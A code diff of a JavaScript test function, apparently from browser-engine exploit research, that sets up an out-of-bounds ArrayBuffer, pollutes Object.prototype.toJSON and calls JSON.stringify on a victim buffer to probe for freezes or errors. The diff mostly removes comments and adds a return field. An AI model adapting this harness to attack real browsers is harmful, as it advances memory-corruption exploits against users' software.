@@ -41,7 +41,7 @@ export async function executeFullFreezeScenarioTest(
     if (!oob_array_buffer_real) {
         logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
         document.title = "ERRO: Falha OOB Setup";
-        return { potentiallyFroze: false, errorOccurred: true };
+        return { potentiallyFroze: false, errorOccurred: true, calls: currentCallCount_toJSON };
     }
     document.title = "OOB Configurado";
 
@@ -51,7 +51,7 @@ export async function executeFullFreezeScenarioTest(
     let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKeyToPollute);
     let pollutionAppliedThisRun = false;
     let stepReached = "antes_pp";
-    let potentiallyFroze = true; // Assumir que vai congelar até que complete ou capture erro JS
+    let potentiallyFroze = true; 
     let errorOccurred = false;
 
     try {
@@ -76,24 +76,22 @@ export async function executeFullFreezeScenarioTest(
         stepReached = "apos_escrita_oob";
         document.title = `Após Escrita OOB: ${testVariantDescription}`;
         
-        await PAUSE_S3(SHORT_PAUSE_S3); // Pequena pausa antes do stringify
+        await PAUSE_S3(SHORT_PAUSE_S3); 
 
         stepReached = "antes_stringify";
         document.title = `Antes Stringify: ${testVariantDescription}`;
         logS3(`Chamando JSON.stringify(victim_ab)... (PONTO CRÍTICO PARA CONGELAMENTO)`, "info", FNAME_TEST);
         let stringifyResult = null;
         try {
-            // A função toJSONFunctionLogic será chamada aqui DENTRO pelo stringify
             stringifyResult = JSON.stringify(victim_ab); 
             stepReached = "apos_stringify";
             document.title = `Stringify Retornou: ${testVariantDescription}`;
             potentiallyFroze = false;
             logS3(`Resultado de JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME_TEST);
-            // Verificar se o toJSON retornou um erro que foi stringificado
             if (stringifyResult && typeof stringifyResult === 'string' && 
-                (stringifyResult.includes("toJSON_error_") || stringifyResult.includes("toJSON_this_is_null"))) { // Adaptar às chaves de erro das suas toJSON
+                (stringifyResult.includes("toJSON_error_") || stringifyResult.includes("toJSON_this_is_null"))) { 
                 logS3("SUCESSO ESPECULATIVO: Erro indicado no resultado do toJSON stringificado.", "vuln", FNAME_TEST);
-                errorOccurred = true; // Considerar um erro JS dentro do toJSON como um "não congelamento"
+                errorOccurred = true; 
             }
         } catch (e) {
             stepReached = "erro_stringify";
